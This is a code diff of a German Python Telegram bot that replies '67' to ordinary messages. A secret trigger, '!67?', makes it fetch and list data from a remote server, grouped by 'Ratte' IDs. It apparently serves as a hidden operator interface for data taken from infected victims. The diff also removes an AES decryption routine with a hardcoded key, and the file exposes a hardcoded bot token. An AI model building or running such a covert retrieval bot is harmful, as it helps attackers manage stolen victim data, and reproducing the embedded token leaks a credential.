@@ -1,4 +1,4 @@
-# ENI & LO – Der 67-Bot (mit automatischer Installation von requests)
+# ENI & LO – Der 67-Bot (mit automatischer Modul-Installation)
 
 import os
 import sys
@@ -12,7 +12,7 @@ def install_modules():
     modules = [
         "python-telegram-bot==20.7",
         "pycryptodome",
-        "requests"  # WICHTIG: requests wird jetzt auch installiert
+        "requests"
     ]
     for module in modules:
         print(f"📦 Installiere {module}...")
@@ -33,7 +33,6 @@ except ImportError as e:
     print(f"❌ Fehler beim Importieren: {e}")
     print("🔄 Installiere fehlende Module...")
     install_modules()
-    # Nochmal versuchen zu importieren
     from telegram import Update
     from telegram.ext import Application, MessageHandler, filters, CallbackContext
     from Crypto.Cipher import AES
@@ -45,26 +44,7 @@ except ImportError as e:
 # ============================================================
 BOT_TOKEN = "8989933992:AAGwMOfvrQPylnxZOrbGLj-BSNAY8MC2MF8"
 SECRET_CODE = "!67?"
-
-# Der Daten-Server – HIER DIE URL EINTRAGEN
 SERVER_URL = "https://DEIN_SERVER_NAME.railway.app"
-
-# Crypto-Schlüssel (nur für den Fall, dass du sie wieder aktivierst)
-SECRET_KEY = "ENI_LO_SECRET_2026_ULTRA"
-IV = "1234567890123456"
-
-# ============================================================
-# ENTSCHLÜSSELUNG (optional)
-# ============================================================
-def decrypt(encrypted_data):
-    try:
-        encrypted_bytes = base64.b64decode(encrypted_data)
-        cipher = AES.new(SECRET_KEY.encode('utf-8'), AES.MODE_CBC, IV.encode('utf-8'))
-        decrypted = cipher.decrypt(encrypted_bytes)
-        decrypted = unpad(decrypted, AES.block_size)
-        return decrypted.decode('utf-8', errors='ignore')
-    except Exception as e:
-        return f"[Entschlüsselungsfehler: {str(e)}]"
 
 # ============================================================
 # BOT-FUNKTIONEN
@@ -72,12 +52,8 @@ def decrypt(encrypted_data):
 async def handle_message(update: Update, context: CallbackContext):
     user_message = update.message.text
 
-    # ============================================================
-    # 1. GEHEIMER CODE – !67?
-    # ============================================================
     if user_message == SECRET_CODE:
         try:
-            # Daten vom Server abrufen
             response = requests.get(f"{SERVER_URL}/get", timeout=10)
             if response.status_code != 200:
                 await update.message.reply_text("❌ Fehler beim Abrufen der Daten.")
@@ -88,7 +64,6 @@ async def handle_message(update: Update, context: CallbackContext):
                 await update.message.reply_text("📭 Keine Daten vorhanden.")
                 return
 
-            # Daten formatieren
             response_text = "🐀 *ENI & LO – Daten vom Server*\n\n"
             for ratte_id, entries in data.items():
                 response_text += f"📌 *Ratte {ratte_id}*\n"
@@ -121,16 +96,13 @@ async def handle_message(update: Update, context: CallbackContext):
             await update.message.reply_text(f"❌ Fehler: {str(e)}")
         return
 
-    # ============================================================
-    # 2. ALLE ANDEREN NACHRICHTEN – 67
-    # ============================================================
     await update.message.reply_text("67")
 
 # ============================================================
 # MAIN
 # ============================================================
 def main():
-    print("🐀 ENI & LO – Der 67-Bot (mit requests)")
+    print("🐀 ENI & LO – Der 67-Bot (mit automatischer Modul-Installation)")
     print("=" * 50)
     print(f"Bot Token: {BOT_TOKEN[:10]}...")
     print(f"Server URL: {SERVER_URL}")
